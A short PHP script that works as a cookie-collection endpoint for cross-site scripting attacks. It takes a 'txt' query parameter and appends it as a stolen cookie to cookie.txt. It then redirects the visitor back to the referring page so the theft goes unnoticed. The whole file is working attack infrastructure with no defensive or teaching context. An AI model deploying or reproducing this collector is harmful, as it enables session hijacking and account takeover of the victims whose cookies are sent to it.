<?php
$txt=$_GET['txt'];
$result="cookie:$txt\n";
$file=fopen('cookie.txt',"a");
fwrite($file,$result);
fclose($file);

$referer = $_SERVER['HTTP_REFERER'] ?? null;

if ($referer !== null) {
    header('Location: ' . $referer);
    exit; // Make sure to exit after sending the header to prevent further execution
} else {
    // Handle case where HTTP referer is not set
    // For example, you could redirect to a default page or show an error message
    //echo "HTTP referer is not set. Redirect cannot be performed.";
    // Alternatively, you can redirect to a specific page like this:
    // header('Location: https://example.com/');
    exit;
}

?>
